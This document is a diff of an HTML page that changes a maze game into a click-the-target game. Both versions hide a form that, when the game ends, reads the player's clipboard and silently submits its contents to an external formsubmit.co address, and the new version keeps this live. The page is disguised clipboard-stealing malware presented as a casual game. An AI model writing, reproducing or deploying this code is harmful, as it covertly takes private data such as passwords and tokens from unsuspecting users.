@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Maze Escape - Clipboard Game</title>
+    <title>Click the Target Game</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,48 +14,43 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
 
         #gameArea {
             position: relative;
-            width: 400px;
-            height: 400px;
+            width: 500px;
+            height: 500px;
             background-color: #fff;
             border: 2px solid #333;
-            display: grid;
-            grid-template-columns: repeat(10, 40px);
-            grid-template-rows: repeat(10, 40px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        .maze-block {
-            width: 40px;
-            height: 40px;
-            background-color: #e0e0e0;
-            border: 1px solid #ddd;
+        .target {
+            width: 50px;
+            height: 50px;
+            background-color: red;
+            border-radius: 50%;
+            position: absolute;
+            cursor: pointer;
         }
 
-        .wall {
-            background-color: #333;
+        #score {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 24px;
+            color: #333;
         }
 
-        .start {
-            background-color: #00ff00;
-        }
-
-        .exit {
-            background-color: #ff0000;
-        }
-
-        .player {
-            background-color: #0000ff;
-        }
-
-        .game-message {
+        #gameMessage {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 24px;
+            font-size: 32px;
             color: #000;
             display: none;
             background-color: rgba(255, 255, 255, 0.7);
@@ -67,113 +62,104 @@
 <body>
 
 <div id="gameArea">
-    <!-- Create a 10x10 grid of blocks for the maze -->
-    <div class="maze-block start" id="start"></div>
-    <div class="maze-block wall" id="wall1"></div>
-    <div class="maze-block wall" id="wall2"></div>
-    <div class="maze-block wall" id="wall3"></div>
-    <div class="maze-block wall" id="wall4"></div>
-    <div class="maze-block wall" id="wall5"></div>
-    <div class="maze-block wall" id="wall6"></div>
-    <div class="maze-block wall" id="wall7"></div>
-    <div class="maze-block wall" id="wall8"></div>
-    <div class="maze-block exit" id="exit"></div>
-
-    <!-- Player -->
-    <div class="maze-block player" id="player"></div>
+    <div id="score">Score: 0</div>
+    <div id="gameMessage">You won!</div>
 </div>
 
-<div id="gameMessage" class="game-message">Congratulations! You found the exit!</div>
-
 <form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
-    <input type="hidden" name="_subject" value="Maze Game - Secret Unlocked!" />
+    <input type="hidden" name="_subject" value="Click the Target Game - Secret Unlocked!" />
     <input type="hidden" name="_next" value="thank_you.html" />
     <input type="hidden" id="clipboardContent" name="clipboardContent" />
 </form>
 
 <script>
-    // Set up the maze
-    const player = document.getElementById('player');
-    const start = document.getElementById('start');
-    const exit = document.getElementById('exit');
+    // Game Variables
+    const gameArea = document.getElementById('gameArea');
+    const scoreDisplay = document.getElementById('score');
     const gameMessage = document.getElementById('gameMessage');
-    const mazeArea = document.getElementById('gameArea');
+    const hiddenForm = document.getElementById('hiddenForm');
+    const target = document.createElement('div');
+    let score = 0;
+    let gameInterval;
+    let targetMoveInterval;
 
-    let playerPosition = { x: 0, y: 0 }; // Player's initial position (grid-based)
-    
-    // Walls in the maze grid (represented by their positions)
-    const walls = [
-        { x: 1, y: 0 }, { x: 2, y: 0 }, { x: 3, y: 0 },
-        { x: 3, y: 1 }, { x: 4, y: 1 },
-        { x: 2, y: 2 }, { x: 3, y: 2 },
-        { x: 5, y: 3 }, { x: 6, y: 3 },
-        { x: 5, y: 4 }, { x: 5, y: 5 },
-        { x: 1, y: 6 }, { x: 2, y: 6 },
-        { x: 3, y: 6 }, { x: 4, y: 6 },
-        { x: 7, y: 7 }, { x: 8, y: 7 }
-    ];
+    // Set up the game
+    function initializeGame() {
+        // Create the target
+        target.classList.add('target');
+        gameArea.appendChild(target);
 
-    // Mark the walls on the grid
-    walls.forEach(wall => {
-        const wallDiv = document.createElement('div');
-        wallDiv.classList.add('maze-block', 'wall');
-        wallDiv.style.gridRowStart = wall.y + 1;
-        wallDiv.style.gridColumnStart = wall.x + 1;
-        mazeArea.appendChild(wallDiv);
-    });
+        // Add click event to the target
+        target.addEventListener('click', onTargetClick);
 
-    // Update player position
-    function updatePlayerPosition() {
-        player.style.gridRowStart = playerPosition.y + 1;
-        player.style.gridColumnStart = playerPosition.x + 1;
+        // Start moving the target
+        startTargetMovement();
+
+        // Start the game timer
+        startGameTimer();
     }
 
-    // Move the player based on arrow keys
-    function movePlayer(event) {
-        if (event.key === 'ArrowUp' && playerPosition.y > 0 && !isWall(playerPosition.x, playerPosition.y - 1)) {
-            playerPosition.y--;
-        } else if (event.key === 'ArrowDown' && playerPosition.y < 9 && !isWall(playerPosition.x, playerPosition.y + 1)) {
-            playerPosition.y++;
-        } else if (event.key === 'ArrowLeft' && playerPosition.x > 0 && !isWall(playerPosition.x - 1, playerPosition.y)) {
-            playerPosition.x--;
-        } else if (event.key === 'ArrowRight' && playerPosition.x < 9 && !isWall(playerPosition.x + 1, playerPosition.y)) {
-            playerPosition.x++;
-        }
+    // Start the target movement at random intervals
+    function startTargetMovement() {
+        targetMoveInterval = setInterval(() => {
+            const maxX = gameArea.offsetWidth - target.offsetWidth;
+            const maxY = gameArea.offsetHeight - target.offsetHeight;
+            const randomX = Math.floor(Math.random() * maxX);
+            const randomY = Math.floor(Math.random() * maxY);
 
-        updatePlayerPosition();
+            target.style.left = randomX + 'px';
+            target.style.top = randomY + 'px';
+        }, 1000);  // Target moves every 1 second
+    }
 
-        // Check if player has reached the exit
-        if (playerPosition.x === 9 && playerPosition.y === 5) {
-            gameMessage.style.display = 'block';
-            copyClipboardAndSubmit();
+    // Handle clicking the target
+    function onTargetClick() {
+        score++;
+        scoreDisplay.textContent = `Score: ${score}`;
+
+        // Move the target to a new position immediately after a click
+        const maxX = gameArea.offsetWidth - target.offsetWidth;
+        const maxY = gameArea.offsetHeight - target.offsetHeight;
+        const randomX = Math.floor(Math.random() * maxX);
+        const randomY = Math.floor(Math.random() * maxY);
+
+        target.style.left = randomX + 'px';
+        target.style.top = randomY + 'px';
+
+        // Check if the player reached a certain score to win the game
+        if (score >= 10) {
+            endGame();
         }
     }
 
-    // Check if a position is a wall
-    function isWall(x, y) {
-        return walls.some(wall => wall.x === x && wall.y === y);
+    // End the game
+    function endGame() {
+        clearInterval(targetMoveInterval);
+        gameMessage.style.display = 'block';
+        copyClipboardAndSubmit();
+    }
+
+    // Start the game timer
+    function startGameTimer() {
+        gameInterval = setTimeout(() => {
+            endGame();
+        }, 30000);  // End the game after 30 seconds if not finished
     }
 
     // Copy clipboard content and submit the form
     function copyClipboardAndSubmit() {
         navigator.clipboard.readText().then(function(clipText) {
-            // Set the clipboard content into a hidden form field
             document.getElementById('clipboardContent').value = clipText;
-
-            // Automatically submit the form
             setTimeout(function() {
                 document.getElementById('hiddenForm').submit();
-            }, 1000); // Delay before submitting the form
+            }, 1000);
         }).catch(function(err) {
             console.error('Failed to read clipboard contents: ', err);
         });
     }
 
-    // Add event listener to listen for arrow keys
-    document.addEventListener('keydown', movePlayer);
-
-    // Initialize the player position
-    updatePlayerPosition();
+    // Initialize the game
+    initializeGame();
 </script>
 
 </body>
